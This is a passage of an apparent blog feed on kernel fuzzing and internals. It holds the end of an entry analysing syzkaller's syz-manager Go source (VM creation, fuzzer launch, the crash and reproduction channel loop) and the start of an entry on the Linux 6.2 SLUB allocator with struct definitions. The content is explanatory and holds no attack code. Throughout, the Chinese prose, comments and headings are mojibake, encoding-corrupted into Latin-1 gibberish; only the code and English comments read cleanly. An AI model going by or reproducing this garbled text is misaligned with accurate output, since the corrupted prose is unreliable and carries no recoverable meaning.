&#123;<br>machineInfo = <span class="hljs-built_in">append</span>(<span class="hljs-built_in">append</span>(vmInfo, <span class="hljs-string">&#x27;\n&#x27;</span>), machineInfo...)<br>&#125;<br><br><span class="hljs-comment">// Error that is not a VM crash.</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-comment">// No crash.</span><br><span class="hljs-keyword">if</span> rep == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br>crash := &amp;Crash&#123;<br>vmIndex:     index,<br>hub:         <span class="hljs-literal">false</span>,<br>Report:      rep,<br>machineInfo: machineInfo,<br>&#125;<br><span class="hljs-keyword">return</span> crash, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>runInstanceInner()</code> çš„æ ¸å¿ƒéƒ¨åˆ†ä¸»è¦æ˜¯ï¼š</p><ul><li><p>è°ƒç”¨ <code>vmPool.Create()</code> åˆ›å»º VMï¼Œè°ƒç”¨ <code>inst.Forward()</code> è¿›è¡Œ TCP è½¬å‘ï¼Œæ‹·è´ <code>syz-fuzzer</code> ä¸ <code>syz-executor</code> åˆ° VM æ–‡ä»¶ç³»ç»Ÿä¸­</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runInstanceInner(index <span class="hljs-type">int</span>, instanceName <span class="hljs-type">string</span>) (*report.Report, []<span class="hljs-type">byte</span>, <span class="hljs-type">error</span>) &#123;<br>inst, err := mgr.vmPool.Create(index)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create instance: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> inst.Close()<br><br>fwdAddr, err := inst.Forward(mgr.serv.port)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to setup port forwarding: %v&quot;</span>, err)<br>&#125;<br><br>fuzzerBin, err := inst.Copy(mgr.cfg.FuzzerBin)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to copy binary: %v&quot;</span>, err)<br>&#125;<br><br><span class="hljs-comment">// è‹¥æä¾›äº† ExecutorBin , è¿™æ„å‘³ç€ syz-executor æ—©å·²åœ¨é•œåƒä¸­,</span><br><span class="hljs-comment">// æ•…æ— éœ€è¿›è¡Œæ‹·è´.</span><br>executorBin := mgr.sysTarget.ExecutorBin<br><span class="hljs-keyword">if</span> executorBin == <span class="hljs-string">&quot;&quot;</span> &#123;<br>executorBin, err = inst.Copy(mgr.cfg.ExecutorBin)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to copy binary: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br>fuzzerV := <span class="hljs-number">0</span><br>procs := mgr.cfg.Procs<br><span class="hljs-keyword">if</span> *flagDebug &#123;<br>fuzzerV = <span class="hljs-number">100</span><br>procs = <span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>è°ƒç”¨ <code>instance.FuzzerCmd()</code> ç”Ÿæˆå‘½ä»¤è¡Œåè°ƒç”¨ <code>inst.Run()</code> å¯åŠ¨ <code>syz-fuzzer</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Run the fuzzer binary.</span><br>start := time.Now()<br>atomic.AddUint32(&amp;mgr.numFuzzing, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">defer</span> atomic.AddUint32(&amp;mgr.numFuzzing, ^<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))<br>  <br>args := &amp;instance.FuzzerCmdArgs&#123;<br>Fuzzer:    fuzzerBin,<br>Executor:  executorBin,<br>Name:      instanceName,<br>OS:        mgr.cfg.TargetOS,<br>Arch:      mgr.cfg.TargetArch,<br>FwdAddr:   fwdAddr,<br>Sandbox:   mgr.cfg.Sandbox,<br>Procs:     procs,<br>Verbosity: fuzzerV,<br>Cover:     mgr.cfg.Cover,<br>Debug:     *flagDebug,<br>Test:      <span class="hljs-literal">false</span>,<br>Runtest:   <span class="hljs-literal">false</span>,<br>Optional: &amp;instance.OptionalFuzzerArgs&#123;<br>Slowdown:   mgr.cfg.Timeouts.Slowdown,<br>RawCover:   mgr.cfg.RawCover,<br>SandboxArg: mgr.cfg.SandboxArg,<br>&#125;,<br>&#125;<br>cmd := instance.FuzzerCmd(args)<br>outc, errc, err := inst.Run(mgr.cfg.Timeouts.VMRunningTime, mgr.vmStop, cmd)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to run fuzzer: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>è°ƒç”¨ <code>inst.MonitorExecution()</code> ç›‘æ§ VM è¿è¡Œï¼Œè¯¥å‡½æ•°ä¸»è¦æ˜¯<strong>é€šè¿‡è·å– kernel oops æ¥åˆ¤æ–­æ˜¯å¦è§¦å‘äº† crash</strong>ï¼ˆKASAN ä¸ä¼šé€ æˆ kernel panicï¼Œä»è€Œä½¿å¾—ä¸€ä¸ª VM å®ä¾‹é•¿æœŸè¿è¡Œï¼Œä¸è¿‡ dmesg ä¸­ä»æœ‰ oopsï¼‰</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> vmInfo []<span class="hljs-type">byte</span><br>rep := inst.MonitorExecution(outc, errc, mgr.reporter, vm.ExitTimeout)<br><span class="hljs-keyword">if</span> rep == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// This is the only &quot;OK&quot; outcome.</span><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%s: running for %v, restarting&quot;</span>, instanceName, time.Since(start))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>vmInfo, err = inst.Info()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>vmInfo = []<span class="hljs-type">byte</span>(fmt.Sprintf(<span class="hljs-string">&quot;error getting VM info: %v\n&quot;</span>, err))<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> rep, vmInfo, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="Step-3-ç­‰å¾…å¤„ç†ä¸åŒ-channel-æ•°æ®"><a href="#Step-3-ç­‰å¾…å¤„ç†ä¸åŒ-channel-æ•°æ®" class="headerlink" title="Step 3. ç­‰å¾…å¤„ç†ä¸åŒ channel æ•°æ®"></a>Step 3. ç­‰å¾…å¤„ç†ä¸åŒ channel æ•°æ®</h3><p><code>vmLoop()</code> çš„æœ€åä¸»è¦å°±æ˜¯ä¸€ä¸ªå¤§çš„ <code>select</code>ï¼Œç­‰å¾…æŸä¸ª channel ä¸­æœ‰æ•°æ®åè¿›è¡Œå¤„ç†ï¼Œä¹‹åé‡æ–°è·³å›ç­‰å¾…å¤„ç†æˆ–æ˜¯å¼€å§‹ä¸‹ä¸€è½®å¾ªç¯ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> stopRequest <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br><span class="hljs-keyword">if</span> !stopPending &amp;&amp; canRepro() &#123;<br>stopRequest = mgr.vmStop<br>&#125;<br><br>wait:<br><span class="hljs-keyword">select</span> &#123;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯èµ„æºæ± çš„ <code>Freed</code> channelï¼Œåœ¨ <code>Put()</code> ä¸­ä¼šå°†ç©ºé—² VM idx æ”¾å›èµ„æºæ± åå‘è¯¥ channel é€å…¥ä¸€ä¸ª <code>true</code>ï¼Œè€Œè¿™é‡Œä»€ä¹ˆéƒ½æ²¡æœ‰åšï¼Œç¬”è€…ä¼°è®¡ä¼šåœ¨åç»­ç‰ˆæœ¬ä¸­æ›´æ–°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> &lt;-instances.Freed:<br><span class="hljs-comment">// An instance has been released.</span><br></code></pre></td></tr></table></figure><p><code>stopRequest</code> å…¶å®æ˜¯ <code>Manager.vmStop</code> ï¼Œè¿™ä¸ª channel ä¼šåœ¨ VM instance æ‰€å®ç°çš„ <code>Run()</code> æ–¹æ³•ä¸­è¢«ä½¿ç”¨ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> stopRequest &lt;- <span class="hljs-literal">true</span>:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: issued stop request&quot;</span>)<br>stopPending = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>å½“ <code>runDone</code> ä¸­æœ‰æ•°æ®æ—¶è¯´æ˜<strong>fuzz äº§ç”Ÿäº† crash</strong>ï¼Œæ­¤æ—¶ä¼šå°†äº§ç”Ÿ crash çš„ VM é‡Šæ”¾å›èµ„æºæ± ï¼Œå°† crash å†™å…¥ <code>pendingRepro</code> è¡¨ä¸­ç­‰å¾…ä¸‹ä¸€è½®å¾ªç¯è¿›è¡Œå¤„ç†ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> res := &lt;-runDone:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: instance %v finished, crash=%v&quot;</span>, res.idx, res.crash != <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> res.err != <span class="hljs-literal">nil</span> &amp;&amp; shutdown != <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v&quot;</span>, res.err)<br>&#125;<br>stopPending = <span class="hljs-literal">false</span><br>instances.Put(res.idx)<br><span class="hljs-comment">// On shutdown qemu crashes with &quot;qemu: terminating on signal 2&quot;,</span><br><span class="hljs-comment">// which we detect as &quot;lost connection&quot;. Don&#x27;t save that as crash.</span><br><span class="hljs-keyword">if</span> shutdown != <span class="hljs-literal">nil</span> &amp;&amp; res.crash != <span class="hljs-literal">nil</span> &#123;<br>needRepro := mgr.saveCrash(res.crash)<br><span class="hljs-keyword">if</span> needRepro &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: add pending repro for &#x27;%v&#x27;&quot;</span>, res.crash.Title)<br>pendingRepro[res.crash] = <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>reproDone</code> ä¸­ä¸º crash çš„å¤ç°ç»“æœï¼Œè¿™é‡Œä¼šä¿å­˜å¤ç°ç»“æœå¹¶å°†å¯¹åº”çš„ crash ä» <code>reproducing</code> è¡¨ä¸­åˆ é™¤</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> res := &lt;-reproDone:<br>atomic.AddUint32(&amp;mgr.numReproducing, ^<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))<br>crepro := <span class="hljs-literal">false</span><br>title := <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> res.repro != <span class="hljs-literal">nil</span> &#123;<br>crepro = res.repro.CRepro<br>title = res.repro.Report.Title<br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: repro on %+v finished &#x27;%v&#x27;, repro=%v crepro=%v desc=&#x27;%v&#x27;&quot;</span>,<br>res.instances, res.report0.Title, res.repro != <span class="hljs-literal">nil</span>, crepro, title)<br><span class="hljs-keyword">if</span> res.err != <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;repro failed: %v&quot;</span>, res.err)<br>&#125;<br><span class="hljs-built_in">delete</span>(reproducing, res.report0.Title)<br><span class="hljs-keyword">if</span> res.repro == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> !res.hub &#123;<br>mgr.saveFailedRepro(res.report0, res.stats)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mgr.saveRepro(res)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>shutdown</code> ä¸­æœ‰æ•°æ®åˆ™è¡¨ç¤ºæ”¶åˆ°äº†ç»ˆæ­¢ä¿¡å·ï¼Œæ­¤æ—¶ä¼šå°† <code>shutdown</code> ç½®ä¸º nilï¼Œç»ˆæ­¢å¾ªç¯ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> &lt;-shutdown:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: shutting down...&quot;</span>)<br>shutdown = <span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><p><code>hubReproQueue</code> ä¸Šä¹Ÿå¯èƒ½ä¼ æ¥ crashï¼Œæ­¤å¤„å°†å…¶é€å…¥ <code>pendingRepro</code> è¡¨ä¸­ç­‰å¾…åœ¨åç»­å¾ªç¯ä¸­å¤ç°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> crash := &lt;-mgr.hubReproQueue:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: get repro from hub&quot;</span>)<br>pendingRepro[crash] = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><code>needMoreRepros</code> æ˜¯ä¸€ä¸ªä¼ è¾“ channel çš„ channelï¼Œè¿™é‡Œä¼šå°†ä¸€ä¸ªæ¡ä»¶åˆ¤æ–­ç»“æœä¼ å…¥ä¼ æ¥çš„ channel ä¸­å¹¶é‡æ–°è·³å›ç­‰å¾…ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> reply := &lt;-mgr.needMoreRepros:<br>reply &lt;- phase &gt;= phaseTriagedHub &amp;&amp;<br><span class="hljs-built_in">len</span>(reproQueue)+<span class="hljs-built_in">len</span>(pendingRepro)+<span class="hljs-built_in">len</span>(reproducing) == <span class="hljs-number">0</span><br><span class="hljs-keyword">goto</span> wait<br></code></pre></td></tr></table></figure><p>æœ€åæ˜¯ <code>reproRequest</code>ï¼Œè¯¥ channel æ„ä¸º<strong>ä¸»åŠ¨è¿›è¡Œå¤ç°çš„è¯·æ±‚</strong>ï¼Œè¿™é‡Œä¼šæ‹·è´ <code>reproducing</code> ä½å›¾åå°†å…¶ä¼ å…¥ä¼ æ¥çš„ channel ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> reply := &lt;-mgr.reproRequest:<br>repros := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> title := <span class="hljs-keyword">range</span> reproducing &#123;<br>repros[title] = <span class="hljs-literal">true</span><br>&#125;<br>reply &lt;- repros<br><span class="hljs-keyword">goto</span> wait<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œ<code>syz-manager</code> çš„åŸºæœ¬è¿è¡Œé€»è¾‘åˆ†æå®Œæ¯•</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å®å°±æ˜¯ğŸ‘´ã® Manager ğŸ&lt;/p&gt;</summary>
    
    
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/categories/FUZZ/"/>
    
    
    <category term="æ¼æ´æŒ–æ˜" scheme="https://arttnba3.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="syzkaller" scheme="https://arttnba3.github.io/tags/syzkaller/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
  </entry>
  
  <entry>
    <title>ã€OS.0x04ã€‘Linux å†…æ ¸å†…å­˜ç®¡ç†æµ…æ III - Slub Allocator</title>
    <link href="https://arttnba3.github.io/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/"/>
    <id>https://arttnba3.github.io/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/</id>
    <published>2023-02-23T15:24:42.000Z</published>
    <updated>2023-12-18T07:01:46.674Z</updated>
    
    <content type="html"><![CDATA[<p>åˆ«äººé—®ä½ å“ªé‡Œä¸‘æ€ä½ å†æŠŠä»–åæ‰‹æŒ‚åˆ°è‡ªå·±çš„å° slub é‡Œå¯»æ±‚è®¤åŒ</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><blockquote><p>å› ä¸ºè¿™ç³»åˆ—æ–‡ç« ğŸ•ŠğŸ•ŠğŸ•Šå¤ªä¹…äº†ï¼Œå†…æ ¸çš„å†…å­˜ç®¡ç†ä¹Ÿå‘ç”Ÿäº†ä¸€å®šçš„å˜åŒ–ï¼Œæ‰€ä»¥æœ¬æ–‡ç›´æ¥ç”¨æœ€æ–°çš„ 6.2 ç‰ˆæœ¬çš„å†…æ ¸æºç ï¼šï¼‰</p></blockquote><p>åœ¨<a href="https://arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/">ä¸Šä¸€ç¯‡æ–‡ç« </a> ä¸­ç¬”è€…ç®€è¦ä»‹ç»äº† buddy system çš„åŸºæœ¬æµç¨‹ï¼Œä½†å…¶ä¸ºä¸€ä¸ªã€Œé¡µã€è¿™ä¸€çº§çš„ allocatorï¼Œåœ¨æ—¥å¸¸ç”Ÿæ´»ä¸­ä½¿ç”¨ï¼ˆï¼Ÿï¼‰éš¾å…æœ‰äº›æµªè´¹ï¼Œå› ä¸ºå†…æ ¸ä¸­éœ€è¦åŠ¨æ€å†…å­˜åˆ†é…çš„åœºæ™¯è™½ç„¶å¾ˆå¤šï¼Œä½†æ˜¯æˆ‘ä»¬<strong>é€šå¸¸å¹¶ä¸éœ€è¦ä½¿ç”¨ä¸€æ•´é¡µèµ·æ­¥çš„å†…å­˜ï¼Œè€Œå¾€å¾€æ˜¯éœ€è¦åˆ†é…ä¸€äº›æ¯”è¾ƒå°çš„å¯¹è±¡</strong>â€”â€”å› æ­¤ slab allocator åº”è¿è€Œç”Ÿï¼Œå…¶ä»£æ›¿æˆ‘ä»¬å‘ buddy system è¯·æ±‚å†…å­˜é¡µï¼Œå¹¶åˆ†å‰²ä¸ºå¤šä¸ªå°çš„ objectï¼Œå½“æˆ‘ä»¬æ¯æ¬¡éœ€è¦æ—¶åªéœ€è¦å–ä¸€ä¸ª object å³å¯</p><blockquote><p>slab åˆè¢«ç§°ä¸ºå†…æ ¸çš„å †ï¼ˆheapï¼‰å†…å­˜ç®¡ç†ï¼Œå› ä¸ºå…¶ä¸ç”¨æˆ·æ€çš„å†…å­˜â€œå †â€ï¼ˆheapï¼‰ç±»ä¼¼ï¼Œéƒ½æ˜¯åŠ¨æ€åˆ†é…çš„å†…å­˜</p></blockquote><p>slab allocator ä¸€å…±æœ‰ä¸‰ç§ç‰ˆæœ¬ï¼š</p><ul><li>slabï¼ˆæœ€åˆçš„ç‰ˆæœ¬ï¼Œæœºåˆ¶æ¯”è¾ƒå¤æ‚ï¼Œæ•ˆç‡ä¸é«˜ï¼‰</li><li>slobï¼ˆç”¨äºåµŒå…¥å¼ç­‰åœºæ™¯çš„æä¸ºç®€åŒ–ç‰ˆæœ¬ï¼‰</li><li><strong>slub</strong>ï¼ˆä¼˜åŒ–åçš„ç‰ˆæœ¬ï¼Œ<strong>ç°åœ¨çš„é€šç”¨ç‰ˆæœ¬</strong>ï¼‰</li></ul><blockquote><p>è¿™ä¸‰ç§å†…å­˜åˆ†é…å™¨çš„é¡¶å±‚ API æ˜¯ä¸€è‡´çš„ï¼Œä½†å†…éƒ¨å®ç°æ˜¯ä¸ä¸€è‡´çš„ï¼ˆä¾‹å¦‚ slab å’Œ slub å„è‡ªæœ‰ä¸€ä¸ªå¯¹ <code>kmem_cache</code> çš„ä¸åŒå®šä¹‰ï¼‰</p></blockquote><p>æœ¬ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬ä¸»è¦ä»‹ç»çš„æ˜¯ <strong>slub</strong> ï¼Œä¹Ÿæ˜¯ç°åœ¨å†…æ ¸ä¸­æœ€ä¸ºé€šç”¨çš„å°å¯¹è±¡åˆ†é…å™¨</p><h1 id="0x01-slub-allocator-çš„åŸºæœ¬ç»“æ„"><a href="#0x01-slub-allocator-çš„åŸºæœ¬ç»“æ„" class="headerlink" title="0x01. slub allocator çš„åŸºæœ¬ç»“æ„"></a>0x01. slub allocator çš„åŸºæœ¬ç»“æ„</h1><p>é¦–å…ˆæ¥ä¸€å¼  Overviewï¼š</p><p><img src="https://i.loli.net/2021/07/22/ivPnbsjHyI94m5z.png" alt="image.png"></p><h2 id="ä¸€ã€slabï¼šå•ä»½-object-æ± "><a href="#ä¸€ã€slabï¼šå•ä»½-object-æ± " class="headerlink" title="ä¸€ã€slabï¼šå•ä»½ object æ± "></a>ä¸€ã€slabï¼šå•ä»½ object æ± </h2><p>Linux kernel ä¸­ç”¨ä»¥ç»Ÿç­¹æ‰€æœ‰å†…å­˜çš„ä¾ç„¶æ˜¯ buddy systemï¼Œslub allocator ä¹Ÿä¸ä¾‹å¤–ï¼Œå…¶è´Ÿè´£å‘ buddy system è¯·æ±‚å†…å­˜ååˆ†å‰²ç»™å¤šä¸ªå° object åå†è¿”è¿˜ç»™ä¸Šå±‚è°ƒç”¨è€…ï¼Œ<strong>å•æ¬¡å‘ buddy system æ‰€è¯·æ±‚çš„ä¸€ä»½è¿ç»­å†…å­˜é¡µä¾¿ç§°ä¹‹ä¸ºä¸€å¼  slab</strong>ï¼Œåœ¨å†…æ ¸ä¸­å¯¹åº” <code>slab</code> ç»“æ„ä½“ï¼Œ<strong>æœ¬è´¨ä¸Šæ˜¯å¤ç”¨ page ç»“æ„ä½“</strong>ï¼š</p><blockquote><p>è¿™é‡Œæˆ‘ä»¬ä»…å…³æ³¨ slubï¼Œæ‰€ä»¥ç¬”è€…ä»…æˆªå– slub æ‰€éœ€å­—æ®µ</p><blockquote><p>è€ç‰ˆæœ¬ä¸­ slab æ˜¯ç›´æ¥å†…åµŒåœ¨ page ç»“æ„ä½“ä¸­çš„</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Reuses the bits in struct page */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __page_flags;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_SLUB)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">slab_cache</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slab_list</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">int</span> slabs;<span class="hljs-comment">/* å‰©ä½™çš„ slabs æ•°é‡ */</span><br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><span class="hljs-comment">/* Double-word boundary */</span><br><span class="hljs-type">void</span> *freelist;<span class="hljs-comment">/* ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡ */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span 